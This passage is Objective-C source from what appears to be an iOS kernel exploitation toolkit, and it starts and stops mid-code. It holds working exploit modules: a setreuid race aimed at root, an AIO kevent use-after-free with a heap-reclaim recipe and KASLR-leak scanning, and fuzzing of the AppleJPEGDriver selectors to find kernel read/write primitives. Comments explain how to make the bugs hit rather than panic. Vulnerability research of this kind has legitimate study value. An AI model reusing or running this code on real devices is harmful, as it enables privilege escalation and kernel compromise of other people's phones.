    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!jpeg || !src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOServiceClose(conn); IOObjectRelease(svc);
        return @"surface/jpeg setup failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);

    // The index candidates.  A small value should be harmless; a large one must
    // either echo into the output or fault.
    const uint32_t idxs[8] = {0, 4, 0x40, 0x400, 0x1000, 0x10000, 0x100000, 0x7ffffff0u};
    for (int v = 0; v < 8; v++) {
        uint8_t *big = (uint8_t *)malloc(0x1000);
        uint8_t *bigo = (uint8_t *)malloc(0x1000);
        if (!big || !bigo) { free(big); free(bigo); break; }
        memset(big, 0, 0x1000);
        memset(bigo, 0, 0x1000);
        rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
        // fill the whole bulk-copy window (+0x158..+0x180) with a canary so any
        // echo is unmistakable
        for (uint32_t k = 0x158; k < 0x184; k += 4) {
            uint32_t c = 0xC0FF0000u | k;
            memcpy(big + k, &c, 4);
        }
        // then set the index slot (+0x178) to the candidate
        memcpy(big + 0x178, &idxs[v], 4);
        size_t osz = 0x1000;
        rs_jm_markSel(5, 300 + v);
        kern_return_t k = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &osz);
        AveLog(S(@"[idxwrite] idx +0x178=%#010x -> kr=%#x outSize=%zu", idxs[v], k, osz));
        if (k == KERN_SUCCESS && osz > 0) {
            int nz = 0;
            for (uint32_t q = 0; q < 0x1000; q++)
                if (bigo[q] != 0) { nz = 1; break; }
            if (nz) {
                AveLog(S(@"[idxwrite] *** NON-ZERO OUTPUT for idx=%#x ***", idxs[v]));
                rs_jm_dump(S(@"idxwrite out idx=%#x", idxs[v]), bigo, osz);
            }
        }
        free(big);
        free(bigo);
        rs_jm_drain(notify, S(@"idxwrite %#x", idxs[v]));
    }

    IOServiceClose(conn);
    CFRelease(src); CFRelease(dst);
    IOObjectRelease(svc);
    AveSetStatus(@"index write probe done - see the log");
    return @"index write probe done: 8 index values tried on +0x178; look for a non-zero output or a crash";
}

// CVE-2026-20626 - the ONLY CVE Apple itself describes as "a malicious app may
// be able to gain root privileges", in the Kernel component, fixed in 26.3.
// The fix (found by diffing XNU 12377.41.6 -> 12377.61.12, i.e. across our
// 12377.60.50 build) is a new mutex:
//
//   +/* mutex for synchronizing set{,re}uid */
//   +LCK_MTX_DECLARE_ATTR(setuid_lock, &proc_mlock_grp, &proc_lck_attr);
//   +	lck_mtx_lock(&setuid_lock);       in setuid()
//   +	lck_mtx_unlock(&setuid_lock);     and setreuid()
//
// Apple's own regression test (tests/setreuid.c, added in the same release)
// races two threads:
//     th1: while(1) { setreuid(1, 0); setreuid(UID, 0); }
//     th2: while(1) { setreuid(UID, 0); }
// and then asserts sysctl debug.test.proccnt_uid == 1 - i.e. the race corrupts
// the per-uid process count, because chgproccnt() runs OUTSIDE the
// kauth_cred_proc_update() block and both threads compute it from a stale
// parent.  setreuid()'s own comment says "We are protected from escalation by
// the prechecking" - and the race breaks exactly that protection.
//
// This module measures the race on OUR build: current ids, the chgproccnt
// corruption (via debug.test.proccnt_uid if the sysctl exists), and whether any
// uid/euid ends up different from what was asked for.
NSString *ModSetreuidRace(void) {
    AveLog(@"[setreuid20626] === CVE-2026-20626: concurrent setreuid race ===");
    uid_t ruid = getuid();
    uid_t euid = geteuid();
    AveLog(S(@"[setreuid20626] start: ruid=%d euid=%d", ruid, euid));

    // read the per-uid process count for a few interesting uids
    for (int u = 0; u < 3; u++) {
        unsigned long long ids[3] = {0, 501, 0xbadc0ffeeull};
        unsigned long long cnt = 0;
        size_t sz = sizeof(cnt);
        int r = sysctlbyname("debug.test.proccnt_uid", &cnt, &sz, &ids[u], sizeof(ids[u]));
        AveLog(S(@"[setreuid20626] proccnt_uid(%#llx) = %llu (sysctl r=%d)", ids[u], cnt, r));
    }

    // what is actually legal for this process?  probe the interesting combos.
    struct { uid_t r, e; const char *what; } probes[] = {
        {(uid_t)-1, (uid_t)-1, "no change"},
        {ruid, ruid, "ruid->ruid"},
        {ruid, euid, "ruid,euid"},
        {0, 0, "root (0,0)"},
        {0, (uid_t)-1, "root ruid"},
        {(uid_t)-1, 0, "root euid"},
    };
    for (int i = 0; i < 6; i++) {
        int r = setreuid(probes[i].r, probes[i].e);
        AveLog(S(@"[setreuid20626] probe setreuid(%d,%d) [%s] -> %d (now ruid=%d euid=%d)",
                 probes[i].r, probes[i].e, probes[i].what, r, getuid(), geteuid()));
    }
    // restore
    setreuid(ruid, euid);

    // the race: two threads, the exact shape of Apple's regression test but
    // with values that are legal for this process (its own ids), so the race is
    // driven through the same code path.
    static volatile int g_run = 1;
    static volatile int g_calls = 0;
    static volatile int g_errs = 0;
    static volatile int g_changed = 0;
    g_run = 1; g_calls = 0; g_errs = 0; g_changed = 0;
    AveLog(@"[setreuid20626] racing 2 threads x setreuid for 3 seconds ...");
    dispatch_group_t g = dispatch_group_create();
    for (int t = 0; t < 2; t++) {
        dispatch_group_async(g, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            while (g_run) {
                uid_t a = ruid, b = (t == 0) ? euid : ruid;
                int r = setreuid(a, b);
                __sync_fetch_and_add(&g_calls, 1);
                if (r != 0) __sync_fetch_and_add(&g_errs, 1);
                else if (getuid() != ruid || geteuid() != euid) __sync_fetch_and_add(&g_changed, 1);
                int r2 = setreuid(ruid, euid);
                if (r2 != 0) __sync_fetch_and_add(&g_errs, 1);
            }
        });
    }
    sleep(3);
    g_run = 0;
    dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    AveLog(S(@"[setreuid20626] race done: calls=%d errors=%d unexpected-id-changes=%d",
             g_calls, g_errs, g_changed));
    AveLog(S(@"[setreuid20626] final: ruid=%d euid=%d", getuid(), geteuid()));

    for (int u = 0; u < 3; u++) {
        unsigned long long ids[3] = {0, 501, 0xbadc0ffeeull};
        unsigned long long cnt = 0;
        size_t sz = sizeof(cnt);
        int r = sysctlbyname("debug.test.proccnt_uid", &cnt, &sz, &ids[u], sizeof(ids[u]));
        AveLog(S(@"[setreuid20626] AFTER proccnt_uid(%#llx) = %llu (sysctl r=%d)", ids[u], cnt, r));
    }
    AveSetStatus(@"setreuid race done - see the log");
    if (geteuid() == 0) {
        AveLog(@"[setreuid20626] *** EUID == 0 - ROOT OBTAINED ***");
        return @"ROOT: euid == 0";
    }
    return S(@"setreuid race done: %d calls, %d errors, %d unexpected changes; euid=%d (no root)",
              g_calls, g_errs, g_changed, geteuid());
}

// CVE-free AIO kevent UAF - device-proven on iOS 26.2 / 23C55 (xnu-12377.62.10),
// i.e. the SAME kernel family as our 23C5027f (xnu-12377.60.50).
// Source: AIOsource/lightsword-iphone-16, Sources/Legacy/aio_kevent_rw.c
//
// Mechanism (their device log Documents/aio_uaf.log):
//   main:  lio_listio -> enqueue aio_workq_entry E1
//   main:  SIGEV_KEVENT in the aiocb -> knote, kn_hook = raw dangling ptr
//   racer: aio_return(E1)                       [FREE]
//   racer: aio_read(rcb[i]) on the same thread  [RECLAIM the same slot, LIFO]
//   kernel: do_aio_completion_and_unlock -> KNOTE(hint=1)
//           -> filt_aioevent: E1->flags & AIO_COMPLETED
//   main:  kevent64 -> filt_aioprocess on the DANGLING entry:
//            ext[0] = entry+0x28, ext[1] = entry+0x20, data = 0,
//            TAILQ_REMOVE(+0x10/+0x18), aio_entry_unref(+0x2C),
//            aio_proc_lock(*(+0x40))
//   HIT: the kevent is delivered on the reclaimed entry (ext[1] == marker)
//
// Two rules they found the hard way:
//   * the reclaim request MUST be SIGEV_NONE (a second SIGEV_KEVENT knote
//     makes filt_aioprocess walk the entry twice -> procp == 0 -> FAR=0x58)
//   * reap with aio_return, never aio_cancel (cancel frees the entry while it
//     can still be queued on the KNOTE)
//   * free and reclaim in the SAME thread -> same CPU -> same zone magazine,
//     so the first allocation after the free takes exactly the freed slot.
//
// aio_workq_entry map (zone aio_workq_zonep ~224 B, zeroed on free):
//   +0x10 aio_proc_link (next/prev)  WRITE: *prev = next (TAILQ_REMOVE)
//   +0x20 returnval  i64             READ: kev.ext[1]
//   +0x28 errorval   i32             READ: kev.ext[0]
//   +0x2C refcount   u32             aio_entry_unref -> double-free
//   +0x40 procp      struct proc*    aio_proc_lock(*(v)); 0 -> PANIC FAR=0x58
//   +0x48 uaiocbp    user ptr        -> kev.ident
//   +0x50 aiocb      user ptr        -> kev.udata
// file-scope so the racer block sees the KERNEL's updates.  A block captures a
// plain local by value, so aio_error(&rs_aio_cb) inside the block would read a stale
// snapshot taken before the I/O completed and never observe the completion -
// which is exactly why the reclaim was never issued (issued=0 on every round).
static struct aiocb rs_aio_cb;
static struct aiocb rs_aio_rcb[8];
static char rs_aio_rbuf[8][0x10000];

// Durable log: after a kernel panic the in-app log dies with the device, so the
// run that crashed it used to be unreadable.  Every line is fsynced to
// Documents/aio_uaf.log and re-printed on the next launch.
static NSString *rs_aio_logpath(void) {
    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                         NSUserDomainMask, YES) firstObject];
    return [dir stringByAppendingPathComponent:@"aio_uaf.log"];
}
static void rs_aio_dlog(NSString *line) {
    NSString *path = rs_aio_logpath();
    @try {
        NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
        if (!fh) {
            [[line stringByAppendingString:@"\n"] writeToFile:path atomically:YES
                                                  encoding:NSUTF8StringEncoding error:nil];
            return;
        }
        [fh seekToEndOfFile];
        [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
        [fh synchronizeFile];
        [fh closeFile];
    } @catch (NSException *e) { }
}

NSString *ModAioKevent(void) {
    AveLog(@"[aio20637b12] === AIO kevent UAF: B1 trigger + B2 kevent read ===");

    // re-print whatever the crashed run left behind
    NSString *prev = [NSString stringWithContentsOfFile:rs_aio_logpath()
                                               encoding:NSUTF8StringEncoding error:nil];
    NSString *prevStr = (NSString *)prev;
    if (prevStr.length > 4) {
        AveLog(@"[aio20637b12] === PREVIOUS RUN (survived the reboot) ===");
        NSArray *pl = [prevStr componentsSeparatedByString:@"\n"];
        for (NSUInteger i = 0; i < pl.count && i < 80; i++)
            if (pl[i].length) AveLog(S(@"[prev] %@", pl[i]));
        AveLog(@"[aio20637b12] === END PREVIOUS RUN ===");
    }
    rs_aio_dlog(S(@"=== NEW RUN pid=%d ===", getpid()));

    const size_t FILE_SZ = 0x10000;
    const ssize_t VICTIM_NB = FILE_SZ;
    const ssize_t RECL_NB = 0x0200;
    const int NRECLAIM = 8;
    const uint64_t RECL_MARKER = 0x4141;

    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                         NSUserDomainMask, YES) firstObject];
    NSString *path = [dir stringByAppendingPathComponent:@"aio_uaf.bin"];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        NSMutableData *d = [NSMutableData dataWithLength:FILE_SZ];
        [d writeToFile:path atomically:YES];
    }
    int fd = open([path fileSystemRepresentation], O_RDWR);
    if (fd < 0) return @"cannot open the aio file";

    int kq = kqueue();
    if (kq < 0) { close(fd); return @"kqueue failed"; }

    static char vbuf[0x10000];

    int hits = 0, silent = 0, attempts = 0, panics_guess = 0;
    uint64_t best_kva = 0;
    char best_field[24] = {0};

    const int ROUNDS = 40;
    for (int round = 0; round < ROUNDS; round++) {
        memset(&rs_aio_cb, 0, sizeof rs_aio_cb);
        memset(rs_aio_rcb, 0, sizeof rs_aio_rcb);

        rs_aio_cb.aio_fildes = fd;
        rs_aio_cb.aio_offset = 0;
        rs_aio_cb.aio_buf = vbuf;
        rs_aio_cb.aio_nbytes = VICTIM_NB;
        rs_aio_cb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
        rs_aio_cb.aio_sigevent.sigev_signo = kq;
        rs_aio_cb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAAA1;

        if (aio_read(&rs_aio_cb) != 0) { silent++; continue; }
        attempts++;

        // rotating delay 0/10/50/100 ms before the trigger (their STEP 4)
        static const int delays[4] = {0, 10000, 50000, 100000};
        usleep(delays[round & 3]);

        // racer: free then reclaim, in this same thread (same CPU -> LIFO)
        __block volatile int done = 0;
        __block int issued = 0;
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
            for (int spin = 0; spin < 20000 && !done; spin++) {
                if (aio_error(&rs_aio_cb) == 0) {
                    ssize_t r = aio_return(&rs_aio_cb);
                    if (r >= 0) {
                        for (int i = 0; i < NRECLAIM; i++) {
                            memset(&rs_aio_rcb[i], 0, sizeof(struct aiocb));
                            rs_aio_rcb[i].aio_fildes = fd;
                            rs_aio_rcb[i].aio_offset = 0;
                            rs_aio_rcb[i].aio_buf = rs_aio_rbuf[i];
                            rs_aio_rcb[i].aio_nbytes = RECL_NB;
                            rs_aio_rcb[i].aio_lio_opcode = LIO_READ;
                            rs_aio_rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
                            errno = 0;
                            int rr = aio_read(&rs_aio_rcb[i]);
                            if (rr == 0) {
                                issued++;
                            } else {
                                rs_aio_dlog(S(@"RECLAIM ISSUE FAILED i=%d errno=%d (%s)",
                                              i, errno, strerror(errno)));
                                AveLog(S(@"[aio20637b12] RECLAIM ISSUE FAILED i=%d errno=%d (%s)",
                                         i, errno, strerror(errno)));
                            }
                        }
                        done = 1;
                        return;
                    }
                }
                usleep(20);
            }
        });
        // wait for the racer to finish the free+reclaim
        for (int spin = 0; spin < 100000 && !done; spin++) usleep(50);

        // *** THE MISSING STEP ***
        // "The reclaim requests being ISSUED is not the same as the allocation
        //  having HAPPENED... Waiting for the reclaim I/O to actually complete
        //  means the slot is occupied by our entry, so the filter copies our
        //  bytes out instead of panicking. This is the difference between a
        //  panic and a HIT."
        int rc_done = 0;
        for (int w = 0; w < 400000; w++) {
            rc_done = 1;
            for (int i = 0; i < NRECLAIM; i++) {
                if (aio_error(&rs_aio_rcb[i]) == EINPROGRESS) { rc_done = 0; break; }
            }
            if (rc_done) break;
        }
        AveLog(S(@"[aio20637b12] round=%d reclaim_complete=%d issued=%d", round, rc_done, issued));
        rs_aio_dlog(S(@"round=%d reclaim_complete=%d issued=%d", round, rc_done, issued));
        usleep(2000);

        // B2: read the kevent that filt_aioprocess fills from the stale entry
        struct kevent64_s kev[8];
        memset(kev, 0, sizeof kev);
        struct timespec to;
        to.tv_sec = 0;
        to.tv_nsec = 20000000;   // 20 ms
        // PRE-ARM: the last durable line before the kernel may panic - after a reboot
        // this names the exact state that crashed it
        rs_aio_dlog(S(@"PRE-ARM round=%d issued=%d reclaim_nbytes=%d", round, issued, (int)RECL_NB));
        int n = kevent64(kq, NULL, 0, kev, 8, 0, &to);
        rs_aio_dlog(S(@"POST-ARM round=%d nev=%d", round, n));
        if (n > 0) {
            for (int i = 0; i < n; i++) {
                uint64_t e0 = (uint64_t)kev[i].ext[0];
                uint64_t e1 = (uint64_t)kev[i].ext[1];
                uint64_t id = (uint64_t)kev[i].ident;
                uint64_t ud = (uint64_t)kev[i].udata;
                AveLog(S(@"[aio20637b12] round=%d ev=%d ext0=%#llx ext1=%#llx ident=%#llx udata=%#llx",
                         round, i, e0, e1, id, ud));
                if (e1 == RECL_MARKER || e1 == RECL_NB) {
                    hits++;
                    AveLog(S(@"[aio20637b12] *** HIT: kevent delivered on the RECLAIMED entry (ext1=%#llx) ***", e1));
                }
                // a kernel-looking value in any field is a KASLR anchor
                struct { const char *n; uint64_t v; } flds[] = {
                    {"ext0", e0}, {"ext1", e1}, {"ident", id}, {"udata", ud},
                    {"data", (uint64_t)kev[i].data}, {"fflags", (uint64_t)kev[i].fflags},
                };
                for (int k = 0; k < 6; k++) {
                    uint64_t a = flds[k].v & 0x00ffffffffffffffULL;
                    if ((a >> 40) == 0xFFFFFULL && flds[k].v > best_kva) {
                        best_kva = flds[k].v;
                        snprintf(best_field, sizeof best_field, "%s", flds[k].n);
                    }
                }
            }
        } else {
            silent++;
        }

        // reap with aio_return, never aio_cancel
        for (int i = 0; i < NRECLAIM; i++) {
            for (int s = 0; s < 50000 && aio_error(&rs_aio_rcb[i]) != 0; s++) {}
            aio_return(&rs_aio_rcb[i]);
        }
    }

    close(fd);
    close(kq);
    AveLog(S(@"[aio20637b12] rounds=%d attempts=%d hits=%d silent=%d best_kva=%#llx (%s)",
             ROUNDS, attempts, hits, silent, best_kva, best_field[0] ? best_field : "none"));
    AveSetStatus(@"aio kevent UAF done - see the log");
    if (hits > 0)
        return S(@"aio kevent UAF: %d/%d hits - the kevent IS delivered on the freed entry (kernel read)", hits, attempts);
    return S(@"aio kevent UAF: %d attempts, %d hits (no hit - the reclaim did not land in the slot)", attempts, hits);
}

NSString *ModJpegMethods(void) {
    AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    AveLog(S(@"[jpegmethods] open type0 kr=%#x", kr));
    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"AppleJPEGDriver: userclient not openable"; }

    // notification port: the driver's async completion messages land here
    mach_port_t notify = MACH_PORT_NULL;
    kern_return_t npr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify);
    if (npr == KERN_SUCCESS) {
        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
        kern_return_t nsr = IOConnectSetNotificationPort(conn, 0, notify, 0);
        AveLog(S(@"[jpegmethods] notify port=%#x alloc=%#x set=%#x", notify, npr, nsr));
    } else {
        AveLog(S(@"[jpegmethods] notify alloc failed %#x", npr));
    }

    const uint32_t W = 2048, H = 2048;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    if (!jpeg) { IOServiceClose(conn); IOObjectRelease(svc); return @"jpeg encode failed"; }

    // src: raw jpeg bytes; dst: BGRA; encSrc: BGRA (encode source); encDst: raw 4MB
    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    IOSurfaceRef_ encSrc = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    size_t rawLen = 4 * 1024 * 1024;
    NSDictionary *rp = @{(id)kIOSurfaceWidth: @(rawLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ encDst = IOSurfaceCreate((__bridge CFDictionaryRef)rp);
    if (!src || !dst || !encSrc || !encDst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        if (encSrc) CFRelease(encSrc);
        if (encDst) CFRelease(encDst);
        IOServiceClose(conn); IOObjectRelease(svc);
        return @"surface creation failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
    uint32_t encSrcID = IOSurfaceGetID(encSrc), encDstID = IOSurfaceGetID(encDst);
    AveLog(S(@"[jpegmethods] src=%u dst=%u encSrc=%u encDst=%u jpeg=%zuB",
             srcID, dstID, encSrcID, encDstID, jpeg.length));

    // ---- FULL SELECTOR SWEEP 0..31 ----
    // The kext's own dispatcher (found in the disassembly) reads the selector at
    // IOExternalMethodArguments+0xd0 and compares it against values up to 25,
    // and two bitmasks (0x00091000 and 0x00208000) gate extra selectors - so the
    // selector space on OUR build is far larger than the sel0-sel10 the public
    // PoC documented for iOS 18.7.2.  Everything from 11 up is UNPROBED.  Sweep
    // 0..31 with four shapes: scalar-only, 0x58, 0x1000 and 0xDA0, draining the
    // notification port after each so any kernel->user data is captured.
    AveLog(@"[jpegmethods] === FULL SELECTOR SWEEP 0..31 (four shapes) ===");
    NSString *last = rs_jm_lastSel();
    if (last && last.length > 0)
        AveLog(S(@"[jpegmethods] *** LAST ATTEMPTED BEFORE ANY PANIC: %@ ***", last));
    for (uint32_t sel = 0; sel < 32; sel++) {
        uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
        uint64_t oc64[8];
        uint32_t oc = 8;
        memset(oc64, 0, sizeof oc64);
        rs_jm_markSel(sel, 0);
        kern_return_t kA = IOConnectCallMethod(conn, sel, sc, 6, NULL, 0,
                                               oc64, &oc, NULL, NULL);
        AveLog(S(@"sel%-2u scalar-only   kr=%#x outCnt=%u", sel, kA, oc));

        RSJpegIn b1;
        RSJpegIn b2;
        memset(&b1, 0, sizeof b1);
        memset(&b2, 0, sizeof b2);
        rs_jm_fill(&b1, srcID, dstID, W, H, 0, 0x6161);
        size_t osz = sizeof b2;
        rs_jm_markSel(sel, 1);
        kern_return_t kB = IOConnectCallStructMethod(conn, sel, &b1, sizeof b1, &b2, &osz);
        AveLog(S(@"sel%-2u struct 0x58   kr=%#x outSize=%zu", sel, kB, osz));
        if (kB == KERN_SUCCESS && osz > 0)
            rs_jm_dump(S(@"sel%u 0x58 out", sel), (const uint8_t *)&b2, osz);

        uint8_t *c1 = (uint8_t *)malloc(0x1000);
        uint8_t *c2 = (uint8_t *)malloc(0x1000);
        if (c1 && c2) {
            memset(c1, 0, 0x1000);
            memset(c2, 0, 0x1000);
            rs_jm_fill((RSJpegIn *)c1, srcID, dstID, W, H, 0, 0x6161);
            osz = 0x1000;
            rs_jm_markSel(sel, 2);
            kern_return_t kC = IOConnectCallStructMethod(conn, sel, c1, 0x1000, c2, &osz);
            AveLog(S(@"sel%-2u struct 0x1000 kr=%#x outSize=%zu", sel, kC, osz));
            if (kC == KERN_SUCCESS && osz > 0)
                rs_jm_dump(S(@"sel%u 0x1000 out", sel), c2, osz);
        }
        free(c1);
        free(c2);

        uint8_t *d1 = (uint8_t *)malloc(0xDA0);
        uint8_t *d2 = (uint8_t *)malloc(0xDA0);
        if (d1 && d2) {
            memset(d1, 0, 0xDA0);
            memset(d2, 0, 0xDA0);
            rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 0, 0x6161);
            osz = 0xDA0;
            rs_jm_markSel(sel, 3);
            kern_return_t kD = IOConnectCallStructMethod(conn, sel, d1, 0xDA0, d2, &osz);
            AveLog(S(@"sel%-2u struct 0xDA0  kr=%#x outSize=%zu", sel, kD, osz));
            if (kD == KERN_SUCCESS && osz > 0)
                rs_jm_dump(S(@"sel%u 0xDA0 out", sel), d2, osz);
        }
        free(d1);
        free(d2);

        rs_jm_drain(notify, S(@"sel%u", sel));
    }
    AveLog(@"[jpegmethods] === selector sweep done ===");

    // ---- the 0x58 decode path (sel1), sync and async ----
    RSJpegIn in1;
    RSJpegIn out1;
    memset(&out1, 0, sizeof out1);
    rs_jm_fill(&in1, srcID, dstID, W, H, 0, 0);
    rs_jm_call(conn, 1, &in1, sizeof in1, &out1, sizeof out1, @"decode sync");
    rs_jm_drain(notify, @"sel1 sync");
    memset(&in1, 0, sizeof in1);
    rs_jm_fill(&in1, srcID, dstID, W, H, 1, 0x6161);
    rs_jm_call(conn, 1, &in1, sizeof in1, &out1, sizeof out1, @"decode async");
    rs_jm_drain(notify, @"sel1 async");

    // ---- sel3 encode: BGRA source -> raw jpeg destination ----
    memset(&in1, 0, sizeof in1);
    memset(&out1, 0, sizeof out1);
    rs_jm_fill(&in1, encSrcID, encDstID, W, H, 0, 0);
    in1.field_04 = W * H * 4;
    in1.field_0C = (uint32_t)rawLen;
    rs_jm_call(conn, 3, &in1, sizeof in1, &out1, sizeof out1, @"encode sync");
    rs_jm_drain(notify, @"sel3");

    // ---- sel6/sel7: the 0xDA0 async structs, header at 4 offsets ----
    const int offsets[4] = {0, 0x10, 0x58, 0x100};
    for (int oi = 0; oi < 4; oi++) {
        int off = offsets[oi];
        uint8_t *big = malloc(0xDA0);
        uint8_t *bigo = malloc(0xDA0);
        if (!big || !bigo) { free(big); free(bigo); continue; }
        memset(big, 0, 0xDA0);
        memset(bigo, 0, 0xDA0);
        rs_jm_fill((RSJpegIn *)(big + off), srcID, dstID, W, H, 0, 0x6161);
        rs_jm_call(conn, 6, big, 0xDA0, bigo, 0xDA0, S(@"async decode 0xDA0 off=%#x", off));
        rs_jm_drain(notify, S(@"sel6 off=%#x", off));
        memset(big, 0, 0xDA0);
        memset(bigo, 0, 0xDA0);
        rs_jm_fill((RSJpegIn *)(big + off), encSrcID, encDstID, W, H, 0, 0x7171);
        rs_jm_call(conn, 7, big, 0xDA0, bigo, 0xDA0, S(@"async encode 0xDA0 off=%#x", off));
        rs_jm_drain(notify, S(@"sel7 off=%#x", off));
        free(big);
        free(bigo);
    }

    // ---- sel4/sel5: the 0x1000 structs, header at the same 4 offsets ----
    for (int oi = 0; oi < 4; oi++) {
        int off = offsets[oi];
        uint8_t *big = malloc(0x1000);
        uint8_t *bigo = malloc(0x1000);
        if (!big || !bigo) { free(big); free(bigo); continue; }
        memset(big, 0, 0x1000);
        memset(bigo, 0, 0x1000);
        rs_jm_fill((RSJpegIn *)(big + off), srcID, dstID, W, H, 0, 0x6161);
        rs_jm_call(conn, 4, big, 0x1000, bigo, 0x1000, S(@"sel4 0x1000 off=%#x", off));
        rs_jm_drain(notify, S(@"sel4 off=%#x", off));
        memset(big, 0, 0x1000);
        memset(bigo, 0, 0x1000);
        rs_jm_fill((RSJpegIn *)(big + off), srcID, dstID, W, H, 0, 0x7171);
        rs_jm_call(conn, 5, big, 0x1000, bigo, 0x1000, S(@"sel5 0x1000 off=%#x", off));
        rs_jm_drain(notify, S(@"sel5 off=%#x", off));
        free(big);
        free(bigo);
    }

    // ---- privileged + out-of-range ----
    uint32_t priv = 0;
    rs_jm_call(conn, 8, &priv, sizeof(priv), NULL, 0, @"privileged 4 bytes");
    rs_jm_call(conn, 9, NULL, 0, NULL, 0, @"privileged no args");
    rs_jm_call(conn, 10, NULL, 0, NULL, 0, @"out of range");
    rs_jm_drain(notify, @"end");

    // ---- sel5 FIELD MAP: sel5 returns kr=0 with a zeroed 0x1000 struct but
    //      0xe00002c2 (bad argument) once our canary sits past the 0x58 header,
    //      so there ARE meaningful fields beyond the header.  Map them one
    //      8-byte slot at a time: every slot whose canary changes the kr is a
    //      field the driver reads and validates.  A length or a pointer field
    //      is where a read/write primitive would live. ----
    {
        const uint32_t SLOT = 8, BASE = (uint32_t)sizeof(RSJpegIn);
        const uint32_t NSLOT = (0x1000 - BASE) / SLOT;
        uint32_t bad = 0, okc = 0;
        AveLog(S(@"[jpegmethods] sel5 field map: %u slots of 8 bytes from +%#x", NSLOT, BASE));
        for (uint32_t k = BASE; k + SLOT <= 0x1000; k += SLOT) {
            uint8_t *big = (uint8_t *)malloc(0x1000);
            uint8_t *bigo = (uint8_t *)malloc(0x1000);
            if (!big || !bigo) { free(big); free(bigo); break; }
            memset(big, 0, 0x1000);
            memset(bigo, 0, 0x1000);
            rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k;
            memcpy(big + k, &v, SLOT);          // canary in THIS slot only
            size_t os = 0x1000;
            kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
            if (kr != KERN_SUCCESS) {
                bad++;
                AveLog(S(@"[jpegmethods]   VALIDATED slot +%04x -> kr=%#x", k, kr));
            } else {
                okc++;
            }
            free(big);
            free(bigo);
            if (((k - BASE) & 0x3F) == 0x3F) rs_jm_drain(notify, @"fieldmap");
        }
        AveLog(S(@"[jpegmethods] sel5 field map done: %u validated / %u ignored (of %u slots)",
                 bad, okc, NSLOT));
        rs_jm_drain(notify, @"fieldmap end");
    }

    // ---- sel5 VALUE PROBE: exactly two slots are validated (+0x58, +0x78).
    //      Find what they accept: a length, an index, a count - or a POINTER.
    //      A user pointer that the driver dereferences is a direct primitive,
    //      so the last candidates point at a user buffer we filled with a
    //      known pattern and then check whether the driver changed it. ----
    {
        const uint32_t SLOT = 8, BASE = (uint32_t)sizeof(RSJpegIn);
        uint8_t *ubuf = (uint8_t *)malloc(0x1000);
        if (ubuf) memset(ubuf, 0x41, 0x1000);
        uint64_t uaddr = ubuf ? (uint64_t)(uintptr_t)ubuf : 0;
        AveLog(S(@"[jpegmethods] value probe: pattern buffer at %#llx (filled 0x41)", uaddr));

